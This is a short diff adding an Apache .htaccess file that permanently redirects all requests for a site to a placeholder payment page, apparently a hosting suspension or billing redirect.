@@ -1,0 +1,5 @@
+<IfModule mod_rewrite.c>
+    OPTIONS +Followsymlinks
+    RewriteEngine On
+    RewriteRule (.*) https://domain.com/pay?name=servweb [R=301,L]
+</IfModule>
